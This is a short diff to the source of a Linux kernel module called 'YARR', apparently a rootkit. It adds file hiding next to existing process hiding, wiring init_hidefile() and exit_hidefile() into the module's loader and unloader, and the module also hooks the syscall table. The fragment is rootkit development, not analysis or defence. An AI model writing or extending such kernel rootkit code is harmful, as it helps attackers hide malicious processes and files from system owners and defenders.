@@ -31,6 +31,7 @@
 #include "types.h"
 #include "hook.h"
 #include "hideproc.h"
+#include "hidefile.h"
 
 #ifndef __KERNEL__
 #define __KERNEL__
@@ -165,8 +166,11 @@ static int __init yarr_loader(void) {
 	// Install yarrSyscall().
 	init_syscall();
 
-	// Init everything related with hidding processes.
+	// Initialize everything related with hidding processes.
 	init_hideproc();
+
+	// Initialize everything related with hidding files.
+	init_hidefile();
 
 	debug("Now sys_call_table is at %p\n", getSyscallTable());
 	return 0;
@@ -177,6 +181,9 @@ static int __init yarr_loader(void) {
  */
 static void __exit yarr_unloader(void) {
 	debug("Unloading YARR from kernel...\n");
+
+	// End hiding files.
+	exit_hidefile();
 
 	// End hiding processes.
 	exit_hideproc();
